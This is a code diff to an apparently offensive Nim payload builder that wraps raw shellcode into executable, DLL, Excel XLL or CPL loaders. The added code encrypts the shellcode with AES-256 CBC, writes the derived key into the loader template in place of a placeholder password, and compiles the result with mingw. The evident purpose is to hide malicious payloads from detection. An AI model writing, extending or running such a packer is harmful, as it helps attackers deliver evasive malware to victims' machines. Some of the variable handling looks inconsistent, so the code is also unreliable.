@@ -1,8 +1,15 @@
 import base64
 import strutils
+import sequtils
 import strformat
 import os
 import osproc
+import nimcrypto
+import random
+
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  ## Converts a string to the corresponding byte sequence.
+  @(str.toOpenArrayByte(0, str.high))
 
 let 
     args = commandLineParams()
@@ -13,6 +20,16 @@ var
     fileType: string
     architecture: string
     verbosity: string
+    file: string
+    templatePath: string
+    shellcode: string
+    scArray: seq[byte]
+    shaKey: MDigest[256]
+    key: array[aes256.sizeKey, byte]
+    iv: array[aes256.sizeBlock, byte]
+    encSC: seq[byte]
+
+
 
 if pCount < 2:
     echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
@@ -33,9 +50,35 @@ let
     compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -o=simplexll.xll temp_simplexll.nim"
     compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -o=simplexll.xll temp_simplexll.nim"
 
-var 
-    file: string
-    templatePath: string
+proc aesencrypt(): void = 
+    
+    ## Nim's way API using openArray[byte].
+
+    var ectx: CBC[aes256]
+
+    scArray = shellcode.toByteSeq
+    #var plainText: array[aes256.sizeBlock * 2, byte]
+    #encSC: seq[byte] = newSeq[byte](len(scArray))
+
+    while scArray.len mod 16 != 0:
+        scArray.insert(0x90, 1)
+    #copyMem(addr plainText[0], addr scArray[0], len(scArray))
+
+    randomize()
+    const asciiRange = 32..126
+    let passwd = 32.newSeqWith(asciiRange.rand.char).join
+    var expandedKey = sha256.digest(passwd)
+    shaKey = expandedKey
+    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
+
+    discard randomBytes(addr iv[0], 16)
+
+    # Initialization of CBC[aes256] context with encryption key
+    ectx.init(key, iv)
+    # Encryption process
+    ectx.encrypt(scArray, encSC)
+    # Clear context of CBC[aes256]
+    ectx.clear()
 
 proc generatePayload(): void =
     var 
@@ -48,8 +91,10 @@ proc generatePayload(): void =
     except IOError as err:
         echo "[-] Error: Could not open file!"
         quit(1)
-    # Base64 encode bytes
+
+    # Encode/Encrypt bytes
     let b64shellcode = encode(file)
+    
     # Add base64 shellcode to template
     case fileType:
         of "exe":
@@ -69,8 +114,14 @@ proc generatePayload(): void =
             echo "Error: filetype argument must be dll, xll, or cpl!"
             quit(1)
     let placeholder = "REPLACE_ME"
-    let replacement =  b64shellcode
+    let replacement =  encode(encSC)
+    echo "[*] Encrypting shellcode using AES-256 CBC!"
     templateFile = templateFile.replace(placeholder, replacement)
+    tempFile.writeFile(templateFile)
+
+    let origPass = "BLANK_PASSWORD"  
+    echo "[*] Encrypting shellcode using AES-256 CBC!"
+    templateFile = templateFile.replace(origPass, toHex(shaKey.data))
     tempFile.writeFile(templateFile)
 
     let compileResults = execCmdEx(compileCmd)
